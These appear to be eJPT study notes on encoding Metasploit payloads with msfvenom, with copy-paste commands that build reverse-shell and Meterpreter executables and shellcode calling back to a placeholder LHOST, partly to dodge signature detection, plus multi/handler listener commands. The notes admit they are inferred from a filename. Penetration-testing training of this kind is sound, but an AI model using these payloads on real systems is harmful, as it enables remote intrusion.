# 03 - Encoding Payloads With Msfvenom (eJPT Study Notes)

Note: No transcript was provided. The following is a careful, conservative summary inferred from the filename and the course folder “01-Payloads.” Commands are oriented to authorized lab environments only.

## What the video covers (Introduction / big picture)
- Concept of encoding Metasploit payloads with msfvenom to:
  - Avoid bad characters when embedding shellcode (e.g., in exploits).
  - Slightly obfuscate payloads and sometimes reduce simplistic signature hits.
- Difference between encoding vs. encryption/obfuscation:
  - Encoding transforms bytes (e.g., polymorphic encoders like x86/shikata_ga_nai); it is not encryption and is not a reliable AV bypass.
- Key msfvenom switches for encoding:
  - -e (encoder), -i (iterations), -b (bad characters), -a (arch), --platform, -f (format), -o (output).
- How to list encoders and formats, pick an appropriate encoder for the architecture, and test the result in a lab with multi/handler.

## Flow (ordered)
1. Identify target platform and architecture (Windows/Linux, x86/x64).
2. List available encoders and formats in msfvenom.
3. Build a baseline (unencoded) payload for comparison.
4. Select an encoder compatible with the payload architecture.
5. Apply encoding:
   - Set encoder (-e), iterations (-i), and bad characters (-b) if needed.
6. Choose output format (-f) and save to file (-o).
7. Start a matching Metasploit multi/handler to receive the connection (lab).
8. Test, compare behavior and detectability to the baseline.
9. Iterate conservatively; too much encoding can break payloads or raise heuristics.

## Tools highlighted
- msfvenom (Metasploit Framework) for generating and encoding payloads.
- msfconsole exploit/multi/handler for catching sessions in a lab.
- file, hexdump/xxd, and strings for quick sanity checks of generated artifacts.

## Typical command walkthrough (detailed, copy-paste friendly)

Lab-only reminder: Replace placeholders like <LHOST> and paths with your lab values.

- Discover your lab IP (example):
```bash
ip addr show
```

- List encoders, payloads, and formats:
```bash
msfvenom -l encoders
msfvenom -l payloads
msfvenom -l formats
# Narrow by arch/platform
msfvenom -l encoders | grep -i x86
msfvenom -l payloads  | grep -i windows
```

- Inspect payload-specific options before building:
```bash
msfvenom -p windows/meterpreter/reverse_tcp --payload-options
```

- Baseline (unencoded) Windows staged Meterpreter (x86) EXE:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 \
  -a x86 --platform windows \
  -f exe -o win_meter_rev_tcp.exe
```

- Encoded Windows staged Meterpreter using x86/shikata_ga_nai (5 iterations):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 \
  -a x86 --platform windows \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o win_meter_rev_tcp_shikata.exe
```

- Generate shellcode (C array) for use in exploits, avoiding common bad chars:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 \
  -a x86 --platform windows \
  -e x86/alpha_mixed -i 3 \
  -b '\x00\x0a\x0d' \
  -f c -o shellcode.c
```

- Linux payload example (x86) encoded (note: encoders are arch-specific):
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 \
  -a x86 --platform linux \
  -e x86/shikata_ga_nai -i 3 \
  -f elf -o lin_shell_rev_tcp.elf
```

- Quick sanity checks on generated files:
```bash
file win_meter_rev_tcp_shikata.exe
strings -n 8 win_meter_rev_tcp_shikata.exe | head
hexdump -C shellcode.c | head
```

- Start a matching multi/handler in Metasploit (for staged Windows Meterpreter):
```bash
msfconsole -qx "use exploit/multi/handler; \
set payload windows/meterpreter/reverse_tcp; \
set LHOST <LHOST>; set LPORT 4444; \
set ExitOnSession false; exploit -j"
```

- If you generated a stageless payload instead (e.g., windows/meterpreter_reverse_tcp), ensure the handler uses the exact same payload:
```bash
msfconsole -qx "use exploit/multi/handler; \
set payload windows/meterpreter_reverse_tcp; \
set LHOST <LHOST>; set LPORT 4444; \
set ExitOnSession false; exploit -j"
```

Notes:
- x86/shikata_ga_nai works only for x86 payloads. x64 encoders are limited; encoding benefits are generally less pronounced on x64.
- Too many iterations (-i) can make payloads unstable or overly suspicious; start low (1–3).

## Practical tips
- Encoding is not encryption and not a silver bullet for AV/EDR. Use it primarily for bad-character avoidance and minor polymorphism.
- Match the encoder to the payload architecture (x86 vs x64).
- Keep encoding iterations low; test stability after each change.
- Use -b to exclude bad characters when embedding shellcode in exploit buffers.
- Prefer stageless payloads in some scenarios to reduce network signatures, but be consistent with the handler.
- Compare encoded vs unencoded behavior and detection in a controlled lab to understand trade-offs.
- Document exact flags/encoders/iterations for reproducibility.

## Minimal cheat sheet (one-screen flow)
- List options:
```bash
msfvenom -l encoders
msfvenom -l payloads
msfvenom -l formats
```
- Check payload options:
```bash
msfvenom -p <payload> --payload-options
```
- Build baseline:
```bash
msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -a <arch> --platform <plat> -f <fmt> -o out.bin
```
- Add encoder and iterations (plus bad chars if needed):
```bash
msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> \
  -a <arch> --platform <plat> \
  -e <encoder> -i <N> -b '<badchars>' \
  -f <fmt> -o out_encoded.bin
```
- Handler (must match payload exactly):
```bash
msfconsole -qx "use exploit/multi/handler; set payload <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set ExitOnSession false; exploit -j"
```

## Summary
- The video demonstrates how to encode Metasploit payloads with msfvenom to avoid bad characters and add basic polymorphism.
- Core flags: -e (encoder), -i (iterations), -b (bad chars), -a/--platform (arch/platform), -f (format), -o (output).
- x86/shikata_ga_nai is a common polymorphic encoder for x86 payloads; x64 options are more limited.
- Encoding is not a reliable AV/EDR bypass; treat it as a tooling technique and test carefully in a lab with a properly configured multi/handler.